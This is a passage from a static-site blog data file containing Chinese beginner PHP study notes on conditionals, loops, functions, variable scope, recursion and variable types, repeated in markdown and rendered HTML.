class=\"line\">if($b&gt;&#x3D;$a)  &#123;</span><br><span class=\"line\">echo &quot;你已经成年！&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">echo &quot;你还未成年！&quot;</span><br></pre></td></tr></table></figure>\n\n<p>②if…..else..语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(语句)</span><br><span class=\"line\">&#123;   1 &#125;</span><br><span class=\"line\">else</span><br><span class=\"line\">&#123;  2  &#125;   &#x2F;&#x2F;如果语句为true，则执行1，为false则执行2。</span><br></pre></td></tr></table></figure>\n\n<p>③if<br>else if<br>else if<br>else 语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if（语句1）</span><br><span class=\"line\">&#123; 结果1&#125;</span><br><span class=\"line\">else if（语句2）</span><br><span class=\"line\">&#123;   结果2 &#125;</span><br><span class=\"line\">else if（语句3）</span><br><span class=\"line\">&#123;结果3&#125;  &#x2F;&#x2F;首先判断语句1是否为true，为true则执行结果1，为false则判断语句2，语句2 为true则执行结果2，否则判断语句3，直到结束或为true。</span><br><span class=\"line\">else </span><br><span class=\"line\">&#123;结果4&#125;</span><br></pre></td></tr></table></figure>\n\n<p> <strong>0×02：switch 语句</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">switch（表达式）&#123;</span><br><span class=\"line\">  case  值1：</span><br><span class=\"line\">  结果1；</span><br><span class=\"line\">  break；</span><br><span class=\"line\">  </span><br><span class=\"line\">   case  值2：</span><br><span class=\"line\">    结果2；</span><br><span class=\"line\">    break；</span><br><span class=\"line\">    </span><br><span class=\"line\">    case 值3：</span><br><span class=\"line\">    结果3；</span><br><span class=\"line\">    break；</span><br><span class=\"line\">    </span><br><span class=\"line\">    default：</span><br><span class=\"line\">      语句N；</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>注意：<code>表达式的值=值几的时候，才会执行结果几。如果都不满足则执行最后一个default语句，break是必不可少的结束符。</code></p>\n<p><strong>0×03：循环语句</strong></p>\n<p>①while语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">while（表达式）&#123;</span><br><span class=\"line\">各种语句</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>当表达式的值为true，执行各种语句，直到表达式的值为false。</p>\n<p>②do….while 语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">do&#123;</span><br><span class=\"line\">各种语句</span><br><span class=\"line\">&#125;  while（表达式）；&#x2F;&#x2F;先执行各种语句，再判断表达式的真假。</span><br></pre></td></tr></table></figure>\n<p>注意：<code>while（）与do()...while的区别在于do ...while语句至少会被执行一次。</code></p>\n<p>③for语句</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">for（语句1；语句2；语句3）&#123;</span><br><span class=\"line\">各种语句&#125;</span><br></pre></td></tr></table></figure>\n<p>语句1：多为初始化的语句，$a=0;<br>语句2：多为判断是否为真值。<br>语句3：变量自增，自减的语句。<br>注意：<code>无论是语句1，还是语句2，都可以放多个表达式，中间需要用逗号隔开</code>。</p>\n<p><strong>0×04：特殊的控制语句</strong></p>\n<p>①break语句<br>    用于中断一些循环。后面可以接上一些数字表示跳出几层循环，不加默认为跳出当前循环。</p>\n<p>②continue语句<br>只能在循环语句中起作用，表示结束本次循环，本不是结束整个循环语句。</p>\n<p>③exit（）函数<br>结束当前整个程序的执行，并退出。<br>die()函数和其一样。</p>\n"},{"title":"php学习--函数（五）","date":"2020-05-15T07:04:05.000Z","photos":["https://pics.images.ac.cn/image/5ec7b37a4124c.html"],"_content":"\n\n\n﻿目录：\n   0×01：自定义函数\n   0×02：变量范围\n   0×03：参数传递，可变函数\n   0×04：递归函数\n\n\n\n\n\n**0×01：自定义函数**\n    \n   ①函数定义\n       定义：function 函数（参数1，参数2，.....，参数N）{\n        函数体；  //任意有效PHP代码\n        return 表达式；  //不强制写，但写了return 没有表达式，则返回值为null；return也表示代码的结束\n}\n\n②函数的调用\n注意：`无论是系统给的函数，还是自己定义的，如果没有被调用都不会执行！`\n函数调用后执行函数体中的代码，执行完毕后，自动返回调用的位置继续向下执行。\n\n③函数的参数\n形式参数由零个，一个或者多个变量组成。\n实际参数由零个，一个或者多个参数组成，每个参数是一个表达式，由逗号分隔。\n④函数的返回值\n函数的返回值是将函数执行的结果返回给函数的调用者\n如果不写返回，则默认返回值为NULL\n\n**0×02：变量范围**\n\n①局部变量\n也称为内部变量，是在函数内部定义的，当然其适用范围仅限于函数内部，在函数外部肯定使用不了。\n\n```\nfunction  test(){\n$a=1\n}\n```\n这个a就是局部变量\n②全局变量\n也称为外部变量，是在函数外部定义的，其使用范围从变量定义到程序结束。\n全局变量要使用需要使用global定义。\n\n③静态变量\n\n在函数内部定义变量的时候使用static来定义变量。\n特点：函数执行完毕之后变量不会立即消失，再次调用函数时，函数将会保留上次使用过后的只，并且只在第一次执行函数的时候初始化值。\n\n```\nfunction test（）{\nstatic $a-10;\necho ++$a;\n}\ntest();\necho <br   />;\ntest();\n```\n两次输出的值为11，12.\n\n**0×03：参数传递，可变函数**\n\n①按值传递参数\n我们在传递参数时，如果没有声明，就默认为这种方式！这种方式下改变形式参数的值而不会影响到实际参数的值，，相当于两者没有关系。\n\n②按引用传递参数\n相当于形式参数和实际参数指的是同一个人，形式参数的改变会直接影响到实际参数的值！\n\n③函数的默认参数\n可以给形式参数设置默认值，直接赋值即可。\n赋值规则：从左向右，右边的参数必须有值，才能给左边的赋值。\n\n\n④可变长度参数列表\n\n```\nfunc_get_args()   //获取参数的类型，信息\nfunc_get_arg()    //调用此函数时，可以传入一个值（从0开始），表示获取第几个实际参数的信息\nfunc_num_args()     //返回传入参数的类型，个数\n```\n在函数内部使用，返回给我们一些参数信息。\n\n⑤可变函数\n\n```\nfunction  test（）{\necho '我是菜鸟'\n}\n$a=test();   //把函数的名字加上引号赋给变量即可\n$a()   //test()\n```\n**0×04：递归函数**\n\n递归函数即为自调用函数，在函数体内直接或间接自己调用自己，但需要设置自调用的条件，若满足条件，则调用函数本身，若不满足则终止本函数的自调用，然后把目前流程的主控权交回给上一层函数来执行。\n\n```\n<?php\n    function test($n){\n        echo $n . \"  \";\n        if ($n > 0) {\n            test($n - 1);\n        } else {\n            echo \"<-->\";\n        }\n        echo $n . \"  \";\n    }\n    \n    test(10);\n?>\n```\n函数输出的结果：\n\n10 9 8 7 6 5 4 3 2 1 0 <--> 0 1 2 3 4 5 6 7 8 9 10（我也是理解了很久才明白的，有点绕不回来）\n\n执行test(10)，echo 10，然后因为10>0，执行test(9)，后面还有没来得及执行的echo 10\n所以先留来一个10，到第二步时执行test(9) ，echo  9,9>0  ,执行test（9），后面的同样没来得及执行 echo 9，这样保留了一个 9，最外层时10 ， 然后9，8，7，6，5，4，3，2，1\n...............\n最后执行到0时，输出  10 9 8 7 6 5 4 3 2 1 0 <--> 0   此时函数已经不再调用自己，开始将流程的主控权交回给上一层函数来执行。\n\n从内而外输出1，2，3，4，5，6，7，8，9，10，\n最后的输出结果`10 9 8 7 6 5 4 3 2 1 0 <--> 0 1 2 3 4 5 6 7 8 9 10`\n递归函数就结束了。\n\n**0×05：内部（内置）函数**\n\nphp提供给我们很多的现成的函数，来给我们使用。(类似于C语言的库，使用时提前声明)  开启一些扩展模块\n","source":"_posts/php学习--函数（五）.md","raw":"---\ntitle: php学习--函数（五）\ndate: 2020-05-15 15:04:05\ntags: php学习\ncategories: 技术\nphotos: https://pics.images.ac.cn/image/5ec7b37a4124c.html\n---\n\n\n\n﻿目录：\n   0×01：自定义函数\n   0×02：变量范围\n   0×03：参数传递，可变函数\n   0×04：递归函数\n\n\n\n\n\n**0×01：自定义函数**\n    \n   ①函数定义\n       定义：function 函数（参数1，参数2，.....，参数N）{\n        函数体；  //任意有效PHP代码\n        return 表达式；  //不强制写，但写了return 没有表达式，则返回值为null；return也表示代码的结束\n}\n\n②函数的调用\n注意：`无论是系统给的函数，还是自己定义的，如果没有被调用都不会执行！`\n函数调用后执行函数体中的代码，执行完毕后，自动返回调用的位置继续向下执行。\n\n③函数的参数\n形式参数由零个，一个或者多个变量组成。\n实际参数由零个，一个或者多个参数组成，每个参数是一个表达式，由逗号分隔。\n④函数的返回值\n函数的返回值是将函数执行的结果返回给函数的调用者\n如果不写返回，则默认返回值为NULL\n\n**0×02：变量范围**\n\n①局部变量\n也称为内部变量，是在函数内部定义的，当然其适用范围仅限于函数内部，在函数外部肯定使用不了。\n\n```\nfunction  test(){\n$a=1\n}\n```\n这个a就是局部变量\n②全局变量\n也称为外部变量，是在函数外部定义的，其使用范围从变量定义到程序结束。\n全局变量要使用需要使用global定义。\n\n③静态变量\n\n在函数内部定义变量的时候使用static来定义变量。\n特点：函数执行完毕之后变量不会立即消失，再次调用函数时，函数将会保留上次使用过后的只，并且只在第一次执行函数的时候初始化值。\n\n```\nfunction test（）{\nstatic $a-10;\necho ++$a;\n}\ntest();\necho <br   />;\ntest();\n```\n两次输出的值为11，12.\n\n**0×03：参数传递，可变函数**\n\n①按值传递参数\n我们在传递参数时，如果没有声明，就默认为这种方式！这种方式下改变形式参数的值而不会影响到实际参数的值，，相当于两者没有关系。\n\n②按引用传递参数\n相当于形式参数和实际参数指的是同一个人，形式参数的改变会直接影响到实际参数的值！\n\n③函数的默认参数\n可以给形式参数设置默认值，直接赋值即可。\n赋值规则：从左向右，右边的参数必须有值，才能给左边的赋值。\n\n\n④可变长度参数列表\n\n```\nfunc_get_args()   //获取参数的类型，信息\nfunc_get_arg()    //调用此函数时，可以传入一个值（从0开始），表示获取第几个实际参数的信息\nfunc_num_args()     //返回传入参数的类型，个数\n```\n在函数内部使用，返回给我们一些参数信息。\n\n⑤可变函数\n\n```\nfunction  test（）{\necho '我是菜鸟'\n}\n$a=test();   //把函数的名字加上引号赋给变量即可\n$a()   //test()\n```\n**0×04：递归函数**\n\n递归函数即为自调用函数，在函数体内直接或间接自己调用自己，但需要设置自调用的条件，若满足条件，则调用函数本身，若不满足则终止本函数的自调用，然后把目前流程的主控权交回给上一层函数来执行。\n\n```\n<?php\n    function test($n){\n        echo $n . \"  \";\n        if ($n > 0) {\n            test($n - 1);\n        } else {\n            echo \"<-->\";\n        }\n        echo $n . \"  \";\n    }\n    \n    test(10);\n?>\n```\n函数输出的结果：\n\n10 9 8 7 6 5 4 3 2 1 0 <--> 0 1 2 3 4 5 6 7 8 9 10（我也是理解了很久才明白的，有点绕不回来）\n\n执行test(10)，echo 10，然后因为10>0，执行test(9)，后面还有没来得及执行的echo 10\n所以先留来一个10，到第二步时执行test(9) ，echo  9,9>0  ,执行test（9），后面的同样没来得及执行 echo 9，这样保留了一个 9，最外层时10 ， 然后9，8，7，6，5，4，3，2，1\n...............\n最后执行到0时，输出  10 9 8 7 6 5 4 3 2 1 0 <--> 0   此时函数已经不再调用自己，开始将流程的主控权交回给上一层函数来执行。\n\n从内而外输出1，2，3，4，5，6，7，8，9，10，\n最后的输出结果`10 9 8 7 6 5 4 3 2 1 0 <--> 0 1 2 3 4 5 6 7 8 9 10`\n递归函数就结束了。\n\n**0×05：内部（内置）函数**\n\nphp提供给我们很多的现成的函数，来给我们使用。(类似于C语言的库，使用时提前声明)  开启一些扩展模块\n","slug":"php学习--函数（五）","published":1,"updated":"2020-05-27T06:21:14.248Z","comments":1,"layout":"post","link":"","_id":"ckchhpsh0000n9kq6ced56z3u","content":"<p>﻿目录：<br>   0×01：自定义函数<br>   0×02：变量范围<br>   0×03：参数传递，可变函数<br>   0×04：递归函数</p>\n<p><strong>0×01：自定义函数</strong></p>\n<p>   ①函数定义<br>       定义：function 函数（参数1，参数2，…..，参数N）{<br>        函数体；  //任意有效PHP代码<br>        return 表达式；  //不强制写，但写了return 没有表达式，则返回值为null；return也表示代码的结束<br>}</p>\n<p>②函数的调用<br>注意：<code>无论是系统给的函数，还是自己定义的，如果没有被调用都不会执行！</code><br>函数调用后执行函数体中的代码，执行完毕后，自动返回调用的位置继续向下执行。</p>\n<p>③函数的参数<br>形式参数由零个，一个或者多个变量组成。<br>实际参数由零个，一个或者多个参数组成，每个参数是一个表达式，由逗号分隔。<br>④函数的返回值<br>函数的返回值是将函数执行的结果返回给函数的调用者<br>如果不写返回，则默认返回值为NULL</p>\n<p><strong>0×02：变量范围</strong></p>\n<p>①局部变量<br>也称为内部变量，是在函数内部定义的，当然其适用范围仅限于函数内部，在函数外部肯定使用不了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function  test()&#123;</span><br><span class=\"line\">$a&#x3D;1</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个a就是局部变量<br>②全局变量<br>也称为外部变量，是在函数外部定义的，其使用范围从变量定义到程序结束。<br>全局变量要使用需要使用global定义。</p>\n<p>③静态变量</p>\n<p>在函数内部定义变量的时候使用static来定义变量。<br>特点：函数执行完毕之后变量不会立即消失，再次调用函数时，函数将会保留上次使用过后的只，并且只在第一次执行函数的时候初始化值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function test（）&#123;</span><br><span class=\"line\">static $a-10;</span><br><span class=\"line\">echo ++$a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test();</span><br><span class=\"line\">echo &lt;br   &#x2F;&gt;;</span><br><span class=\"line\">test();</span><br></pre></td></tr></table></figure>\n<p>两次输出的值为11，12.</p>\n<p><strong>0×03：参数传递，可变函数</strong></p>\n<p>①按值传递参数<br>我们在传递参数时，如果没有声明，就默认为这种方式！这种方式下改变形式参数的值而不会影响到实际参数的值，，相当于两者没有关系。</p>\n<p>②按引用传递参数<br>相当于形式参数和实际参数指的是同一个人，形式参数的改变会直接影响到实际参数的值！</p>\n<p>③函数的默认参数<br>可以给形式参数设置默认值，直接赋值即可。<br>赋值规则：从左向右，右边的参数必须有值，才能给左边的赋值。</p>\n<p>④可变长度参数列表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func_get_args()   &#x2F;&#x2F;获取参数的类型，信息</span><br><span class=\"line\">func_get_arg()    &#x2F;&#x2F;调用此函数时，可以传入一个值（从0开始），表示获取第几个实际参数的信息</span><br><span class=\"line\">func_num_args()     &#x2F;&#x2F;返回传入参数的类型，个数</span><br></pre></td></tr></table></figure>\n<p>在函数内部使用，返回给我们一些参数信息。</p>\n<p>⑤可变函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function  test（）&#123;</span><br><span class=\"line\">echo &#39;我是菜鸟&#39;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a&#x3D;test();   &#x2F;&#x2F;把函数的名字加上引号赋给变量即可</span><br><span class=\"line\">$a()   &#x2F;&#x2F;test()</span><br></pre></td></tr></table></figure>\n<p><strong>0×04：递归函数</strong></p>\n<p>递归函数即为自调用函数，在函数体内直接或间接自己调用自己，但需要设置自调用的条件，若满足条件，则调用函数本身，若不满足则终止本函数的自调用，然后把目前流程的主控权交回给上一层函数来执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    function test($n)&#123;</span><br><span class=\"line\">        echo $n . &quot;  &quot;;</span><br><span class=\"line\">        if ($n &gt; 0) &#123;</span><br><span class=\"line\">            test($n - 1);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            echo &quot;&lt;--&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        echo $n . &quot;  &quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    test(10);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>函数输出的结果：</p>\n<p>10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0 1 2 3 4 5 6 7 8 9 10（我也是理解了很久才明白的，有点绕不回来）</p>\n<p>执行test(10)，echo 10，然后因为10&gt;0，执行test(9)，后面还有没来得及执行的echo 10<br>所以先留来一个10，到第二步时执行test(9) ，echo  9,9&gt;0  ,执行test（9），后面的同样没来得及执行 echo 9，这样保留了一个 9，最外层时10 ， 然后9，8，7，6，5，4，3，2，1<br>……………<br>最后执行到0时，输出  10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0   此时函数已经不再调用自己，开始将流程的主控权交回给上一层函数来执行。</p>\n<p>从内而外输出1，2，3，4，5，6，7，8，9，10，<br>最后的输出结果<code>10 9 8 7 6 5 4 3 2 1 0 &lt;--&gt; 0 1 2 3 4 5 6 7 8 9 10</code><br>递归函数就结束了。</p>\n<p><strong>0×05：内部（内置）函数</strong></p>\n<p>php提供给我们很多的现成的函数，来给我们使用。(类似于C语言的库，使用时提前声明)  开启一些扩展模块</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿目录：<br>   0×01：自定义函数<br>   0×02：变量范围<br>   0×03：参数传递，可变函数<br>   0×04：递归函数</p>\n<p><strong>0×01：自定义函数</strong></p>\n<p>   ①函数定义<br>       定义：function 函数（参数1，参数2，…..，参数N）{<br>        函数体；  //任意有效PHP代码<br>        return 表达式；  //不强制写，但写了return 没有表达式，则返回值为null；return也表示代码的结束<br>}</p>\n<p>②函数的调用<br>注意：<code>无论是系统给的函数，还是自己定义的，如果没有被调用都不会执行！</code><br>函数调用后执行函数体中的代码，执行完毕后，自动返回调用的位置继续向下执行。</p>\n<p>③函数的参数<br>形式参数由零个，一个或者多个变量组成。<br>实际参数由零个，一个或者多个参数组成，每个参数是一个表达式，由逗号分隔。<br>④函数的返回值<br>函数的返回值是将函数执行的结果返回给函数的调用者<br>如果不写返回，则默认返回值为NULL</p>\n<p><strong>0×02：变量范围</strong></p>\n<p>①局部变量<br>也称为内部变量，是在函数内部定义的，当然其适用范围仅限于函数内部，在函数外部肯定使用不了。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function  test()&#123;</span><br><span class=\"line\">$a&#x3D;1</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个a就是局部变量<br>②全局变量<br>也称为外部变量，是在函数外部定义的，其使用范围从变量定义到程序结束。<br>全局变量要使用需要使用global定义。</p>\n<p>③静态变量</p>\n<p>在函数内部定义变量的时候使用static来定义变量。<br>特点：函数执行完毕之后变量不会立即消失，再次调用函数时，函数将会保留上次使用过后的只，并且只在第一次执行函数的时候初始化值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function test（）&#123;</span><br><span class=\"line\">static $a-10;</span><br><span class=\"line\">echo ++$a;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">test();</span><br><span class=\"line\">echo &lt;br   &#x2F;&gt;;</span><br><span class=\"line\">test();</span><br></pre></td></tr></table></figure>\n<p>两次输出的值为11，12.</p>\n<p><strong>0×03：参数传递，可变函数</strong></p>\n<p>①按值传递参数<br>我们在传递参数时，如果没有声明，就默认为这种方式！这种方式下改变形式参数的值而不会影响到实际参数的值，，相当于两者没有关系。</p>\n<p>②按引用传递参数<br>相当于形式参数和实际参数指的是同一个人，形式参数的改变会直接影响到实际参数的值！</p>\n<p>③函数的默认参数<br>可以给形式参数设置默认值，直接赋值即可。<br>赋值规则：从左向右，右边的参数必须有值，才能给左边的赋值。</p>\n<p>④可变长度参数列表</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func_get_args()   &#x2F;&#x2F;获取参数的类型，信息</span><br><span class=\"line\">func_get_arg()    &#x2F;&#x2F;调用此函数时，可以传入一个值（从0开始），表示获取第几个实际参数的信息</span><br><span class=\"line\">func_num_args()     &#x2F;&#x2F;返回传入参数的类型，个数</span><br></pre></td></tr></table></figure>\n<p>在函数内部使用，返回给我们一些参数信息。</p>\n<p>⑤可变函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function  test（）&#123;</span><br><span class=\"line\">echo &#39;我是菜鸟&#39;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$a&#x3D;test();   &#x2F;&#x2F;把函数的名字加上引号赋给变量即可</span><br><span class=\"line\">$a()   &#x2F;&#x2F;test()</span><br></pre></td></tr></table></figure>\n<p><strong>0×04：递归函数</strong></p>\n<p>递归函数即为自调用函数，在函数体内直接或间接自己调用自己，但需要设置自调用的条件，若满足条件，则调用函数本身，若不满足则终止本函数的自调用，然后把目前流程的主控权交回给上一层函数来执行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">    function test($n)&#123;</span><br><span class=\"line\">        echo $n . &quot;  &quot;;</span><br><span class=\"line\">        if ($n &gt; 0) &#123;</span><br><span class=\"line\">            test($n - 1);</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            echo &quot;&lt;--&gt;&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        echo $n . &quot;  &quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    test(10);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>函数输出的结果：</p>\n<p>10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0 1 2 3 4 5 6 7 8 9 10（我也是理解了很久才明白的，有点绕不回来）</p>\n<p>执行test(10)，echo 10，然后因为10&gt;0，执行test(9)，后面还有没来得及执行的echo 10<br>所以先留来一个10，到第二步时执行test(9) ，echo  9,9&gt;0  ,执行test（9），后面的同样没来得及执行 echo 9，这样保留了一个 9，最外层时10 ， 然后9，8，7，6，5，4，3，2，1<br>……………<br>最后执行到0时，输出  10 9 8 7 6 5 4 3 2 1 0 &lt;–&gt; 0   此时函数已经不再调用自己，开始将流程的主控权交回给上一层函数来执行。</p>\n<p>从内而外输出1，2，3，4，5，6，7，8，9，10，<br>最后的输出结果<code>10 9 8 7 6 5 4 3 2 1 0 &lt;--&gt; 0 1 2 3 4 5 6 7 8 9 10</code><br>递归函数就结束了。</p>\n<p><strong>0×05：内部（内置）函数</strong></p>\n<p>php提供给我们很多的现成的函数，来给我们使用。(类似于C语言的库，使用时提前声明)  开启一些扩展模块</p>\n"},{"title":"php学习--基础知识及变量（一）","date":"2020-04-03T07:04:05.000Z","photos":["http://pic.netbian.com/uploads/allimg/170605/130458-149663909840b3.jpg"],"_content":"\n\n\n﻿**PHP 是什么？**\nPHP（全称：PHP：Hypertext Preprocessor，即\"PHP：超文本预处理器\"）是一种通用开源脚本语言。\nPHP 脚本在服务器上执行。\nPHP 可免费下载使用。\n\n**PHP 文件是什么？**\nPHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\nPHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\nPHP 文件的默认文件扩展名是 \".php\"\n\n**PHP 能做什么？**\nPHP 可以生成动态页面内容\nPHP 可以创建、打开、读取、写入、关闭服务器上的文件\nPHP 可以收集表单数据\nPHP 可以发送和接收 cookies\nPHP 可以添加、删除、修改您的数据库中的数据\nPHP 可以限制用户访问您的网站上的一些页面\nPHP 可以加密数据\n\n**基本的 PHP 语法：**\n1、\nPHP 脚本以 <?php 开始，以 ?> 结束，\nPHP 文件的默认文件扩展名是 \".php\"。\nPHP 文件通常包含 HTML 标签和一些 PHP 脚本代码。\n\n```\n<?php\n// 这是 PHP 单行注释\n\n/*\n这是\nPHP 多行\n注释\n*/\n?>\n```\n使用var_dump(变量名)可以输出变量的类型。\necho只会输出引号内的内容。\n2、**变量**\n1、定义：用于存储信息（数字，字符串等）的\"容器\"。\n给 PHP 变量赋予某个值（x=5）或者表达式（z=x+y）。\n变量可以是很短的名称（如 x 和 y）或者更具描述性的名称（如 age、carname、totalvolume）。\nphp的变量命名比C语言方便多了，使用的时候直接声明一下。\n类似于这样：\n\n```\n$txt=\"Hello world!\";\n$x=5;\n$y=10.5;\n```\n\n*PHP 变量规则：\n变量以 $ 符号开始，后面跟着变量的名称\n变量名必须以字母或者下划线字符开始\n变量名只能包含字母数字字符以及下划线（A-z、0-9 和 _ ）\n变量名不能包含空格\n变量名是区分大小写的（$y 和 $Y 是两个不同的变量）*\n\n注意：\tPHP 语句和 PHP 变量都是区分大小写的。\n\n2、unset($变量名称)函数释放指定的变量。\n\n3、变量类型\n定义：指保存在该变量中的数据类型。\n\n1）bool（布尔型）\n表达了true或false，即真或假。\n以下值被认为false，其他的值都是被认为true。\n**布尔值false\n0\n浮点型0.0\n空白字符串和字符串0\n没有成员的数组\nNULL**\n\n2）int型（整形）\n$a=1;\n\n3)float（浮点型,也称double）\n\n$a=1.1;\n\n4)string(字符串)\n\n字符串是一系列的字符，字符串可以使用单引号，双引号，定界符三种方法来定义。\n\n**单引号：**\n指定一个简单的字持串最简单的方法是使用一对单引号‘’括起来，注意在单引号括起来的字符串中不能再包含单引号，如果实在要用单引号那么就需要反斜杠(\\)转义。\n单引号字符串中出现的变量不会被变量的值替代,即PHP不会解析单引号中的变量，因此在定义鋼单字符串的时候，使用单引号会效率更高，因此没有特别的要求，应使用单引号定义字符串！\n\n***问题：字符串中真正的反斜杠如何表达？\n  用  //***\n\n***双引号***\n双引号中的变量会被变量值所替代，即PHP会解析双引号中的变量。\n双引号中的变量不能直接使用，需要用 {} ， （）括起来。\n\n***定界符***\n<<<之后提供一个标识符开始，然后是字符串的内容，最后是同样的标识符表示结束。\n注意：结束标识符后必须接 ；\n\n标识符命名规则：字母，数字，下划线并且不能以数字开始。\n\n同样可以添加变量但是需要用花括号括起来。\n\n木了木了！！！\n\n","source":"_posts/php学习--基础知识及变量（一）.md","raw":"---\ntitle: php学习--基础知识及变量（一）\ndate: 2020-04-03 15:04:05\ntags: php学习\ncategories: 技术\nphotos: http://pic.netbian.com/uploads/allimg/170605/130458-149663909840b3.jpg\n---\n\n\n\n﻿**PHP 是什么？**\nPHP（全称：PHP：Hypertext Preprocessor，即\"PHP：超文本预处理器\"）是一种通用开源脚本语言。\nPHP 脚本在服务器上执行。\nPHP 可免费下载使用。\n\n**PHP 文件是什么？**\nPHP 文件可包含文本、HTML、JavaScript代码和 PHP 代码\nPHP 代码在服务器上执行，结果以纯 HTML 形式返回给浏览器\nPHP 文件的默认文件扩展名是 \".php\"\n\n**PHP 能做什么？**\nPHP 